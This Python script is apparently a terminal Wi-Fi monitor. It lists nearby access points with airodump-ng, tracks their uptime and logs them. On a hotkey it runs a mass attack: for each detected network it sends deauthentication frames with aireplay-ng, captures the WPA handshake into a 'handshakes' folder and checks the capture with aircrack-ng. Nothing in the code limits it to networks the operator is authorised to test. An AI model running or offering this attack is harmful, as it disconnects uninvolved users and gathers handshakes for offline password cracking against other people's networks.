#!/usr/bin/env python3
import subprocess, threading, time, re, sys, os, signal
from datetime import datetime, timedelta
from collections import defaultdict
from colorama import Fore, Style, init
import queue
import termios, tty, select

init(autoreset=True)

LOG_FILE = "wifi_events.log"
HANDSHAKE_DIR = "handshakes"
os.makedirs(HANDSHAKE_DIR, exist_ok=True)

MON_IF = None
REFRESH = 3

# State
devices_uptime = defaultdict(timedelta)  # bssid/ip -> total uptime
devices_online_since = {}                # bssid/ip -> datetime joined
devices_info = {}                       # bssid/ip -> dict info: ssid, sig, ch, clients
handshake_done = set()                  # bssid with handshake captured
skip_aps = set()                       # bssid to skip during deauth
logs = []                             # event logs lines
lock = threading.Lock()

deauth_running = False
deauth_stop = False

def clear_screen():
    os.system('cls' if os.name=='nt' else 'clear')

def run_cmd(cmd, capture=True):
    try:
        if capture:
            out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True)
            return out.strip()
        else:
            subprocess.Popen(cmd)
            return None
    except Exception as e:
        return None

def select_interface():
    out = run_cmd(['iw', 'dev'])
    if not out:
        print(Fore.RED + "No wireless interfaces found")
        sys.exit(1)
    ifaces = re.findall(r'Interface\s+(\w+)', out)
    for i, iface in enumerate(ifaces, 1):
        print(f" [{i}] {iface}")
    choice = input("Select interface to use: ")
    try:
        idx = int(choice) - 1
        return ifaces[idx]
    except:
        print("Invalid choice")
        sys.exit(1)

def start_airodump(monitor_if):
    # Runs airodump-ng to /tmp/apdump-01.csv continuously
    cmd = ['sudo', 'airodump-ng', '--write-interval', '1', '--output-format', 'csv',
           '--write', '/tmp/apdump', monitor_if]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def parse_airodump_csv():
    path = '/tmp/apdump-01.csv'
    if not os.path.exists(path):
        return {}
    try:
        with open(path, errors='ignore') as f:
            lines = f.read().splitlines()
    except:
        return {}

    aps = {}
    section = 0
    clients = []
    for line in lines:
        if line.strip() == '':
            continue
        if 'BSSID' in line and 'Privacy' in line:
            section = 1
            continue
        elif 'Station MAC' in line:
            section = 2
            continue

        parts = [p.strip() for p in line.split(',')]
        if section == 1 and len(parts) >= 14:
            bssid = parts[0]
            try:
                aps[bssid] = {
                    'ssid': parts[13],
                    'channel': int(parts[3]),
                    'signal': int(parts[8]),
                    'clients': [],
                }
            except Exception:
                pass
        elif section == 2 and len(parts) >= 6:
            clients.append({'mac': parts[0], 'ap': parts[5]})

    for c in clients:
        if c['ap'] in aps:
            aps[c['ap']]['clients'].append(c['mac'])

    return aps

def log_event(event_type, bssid, ssid='', msg=''):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    line = f"{ts} | {event_type:<6} | {bssid:<20} | {ssid:<20} | {msg}"
    with lock:
        logs.append(line)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(line + '\n')

def format_timedelta(td):
    s = int(td.total_seconds())
    h,m,s = s//3600, (s%3600)//60, s%60
    return f"{h}h{m:02d}m{s:02d}s"

def print_ui():
    clear_screen()
    with lock:
        print(Fore.CYAN + f"WIFI MONITOR {datetime.now().strftime('%H:%M:%S')}" + Style.RESET_ALL)
        print("-"*85)
        header = f"{'SSID'.ljust(25)}{'BSSID'.ljust(20)}{'CH'.rjust(3)}{'SIG'.rjust(4)}{'CLIENTS'.rjust(8)}{'UPTIME'.rjust(12)}{'HS'.rjust(5)}{'SKIP'.rjust(5)}"
        print(header)
        print("-"*85)
        # Sort devices by uptime descending
        sorted_devs = sorted(devices_uptime.items(), key=lambda x: x[1], reverse=True)
        for bssid, uptime in sorted_devs:
            info = devices_info.get(bssid, {})
            ssid = info.get('ssid', '')[:25].ljust(25)
            ch = str(info.get('channel', '')).rjust(3)
            sig = info.get('signal', 0)
            sig_str = str(sig).rjust(4)
            if sig >= 60:
                sig_str = Fore.GREEN + sig_str + Style.RESET_ALL
            elif sig >= 40:
                sig_str = Fore.YELLOW + sig_str + Style.RESET_ALL
            else:
                sig_str = Fore.RED + sig_str + Style.RESET_ALL
            clients = str(len(info.get('clients', []))).rjust(8)
            up_str = format_timedelta(uptime).rjust(12)
            hs_mark = Fore.GREEN + '[✔]' + Style.RESET_ALL if bssid in handshake_done else '[--]'
            skip_mark = 'YES' if bssid in skip_aps else ''
            print(f"{ssid}{bssid.ljust(20)}{ch}{sig_str}{clients}{up_str}{hs_mark.rjust(5)}{skip_mark.rjust(5)}")

        print("-"*85)
        print("Logs (latest 8 lines):")
        for line in logs[-8:]:
            print(line[:85])
        print("-"*85)
        print("Hotkeys:")
        print("  d - Start deauth+capture on all (press 's' to stop)")
        print("  k - Skip current AP during deauth")
        print("  q - Quit program")

def update_devices(aps):
    now = datetime.now()
    current_bssids = set(aps.keys())
    with lock:
        # Update devices info and uptime
        for bssid, info in aps.items():
            if bssid not in devices_online_since:
                devices_online_since[bssid] = now
                log_event("JOIN", bssid, info.get('ssid', ''), "Joined")
            devices_info[bssid] = info

        # Handle left devices
        for bssid in list(devices_online_since.keys()):
            if bssid not in current_bssids:
                join_time = devices_online_since.pop(bssid)
                duration = now - join_time
                devices_uptime[bssid] += duration
                log_event("LEAVE", bssid, devices_info.get(bssid, {}).get('ssid', ''), f"Left after {format_timedelta(duration)}")

def deauth_and_capture_all():
    global deauth_running, deauth_stop
    deauth_running = True
    deauth_stop = False
    print(Fore.YELLOW + "Starting deauth + handshake capture. Press 's' to stop." + Style.RESET_ALL)

    for bssid, info in list(devices_info.items()):
        if deauth_stop:
            print(Fore.MAGENTA + "Deauth capture stopped by user." + Style.RESET_ALL)
            break
        if bssid in skip_aps:
            print(f"Skipping AP {bssid} (marked skipped).")
            continue
        ssid = info.get('ssid', '')
        ch = info.get('channel', 1)
        print(f"Deauthing {ssid} ({bssid}) on channel {ch} ...")
        # Spawn airodump-ng to capture handshake
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_ssid = re.sub(r'\W+', '_', ssid or bssid)
        cap_base = os.path.join(HANDSHAKE_DIR, f"{safe_ssid}_{timestamp}")
        airodump = subprocess.Popen(['sudo', 'airodump-ng', '-c', str(ch), '--bssid', bssid, '-w', cap_base, MON_IF],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)  # let it collect packets

        # Run deauth attack
        deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '20', '-a', bssid, MON_IF]
        deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Deauth duration with possible stop
        for i in range(10):
            if deauth_stop:
                deauth_proc.terminate()
                break
            time.sleep(1)

        deauth_proc.terminate()
        airodump.terminate()

        # Verify handshake presence
        cap_file = cap_base + "-01.cap"
        print(f"Verifying handshake in {cap_file} ...", end=' ')
        aircrack = subprocess.run(['aircrack-ng', '-a2', '-w', '/dev/null', cap_file],
                                  stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        if 'Handshake' in aircrack.stdout:
            print(Fore.GREEN + "Handshake found!" + Style.RESET_ALL)
            handshake_done.add(bssid)
            log_event("HANDSHAKE", bssid, ssid, "Success")
        else:
            print(Fore.RED + "No handshake." + Style.RESET_ALL)
            log_event("HANDSHAKE", bssid, ssid, "Fail")

    deauth_running = False
    deauth_stop = False

def input_listener():
    global deauth_stop
    while True:
        # Non-blocking single char input
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd)
            rlist, _, _ = select.select([fd], [], [], 0.1)
            if rlist:
                c = sys.stdin.read(1)
                if c == 'q':
                    print("Quitting...")
                    os._exit(0)
                elif c == 'd':
                    if not deauth_running:
                        threading.Thread(target=deauth_and_capture_all, daemon=True).start()
                    else:
                        print("Deauth already running")
                elif c == 's':
                    if deauth_running:
                        deauth_stop = True
                        print("Stopping deauth...")
                elif c == 'k':
                    # skip currently selected AP (if any)
                    # For demo, just print info. You can extend for interactive selection.
                    print("Skipping AP feature not implemented in this minimal version.")
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        time.sleep(0.1)

def main():
    global MON_IF
    MON_IF = select_interface()
    print(f"Using interface {MON_IF} in monitor mode")

    # Clear logfile at start
    open(LOG_FILE, 'w').close()

    # Start airodump-ng to collect AP info
    airodump_proc = start_airodump(MON_IF)
    time.sleep(2)

    # Start input thread
    threading.Thread(target=input_listener, daemon=True).start()

    try:
        while True:
            aps = parse_airodump_csv()
            update_devices(aps)
            print_ui()
            time.sleep(REFRESH)
    except KeyboardInterrupt:
        print("Exiting...")
    finally:
        if airodump_proc:
            airodump_proc.terminate()

if __name__ == '__main__':
    main()
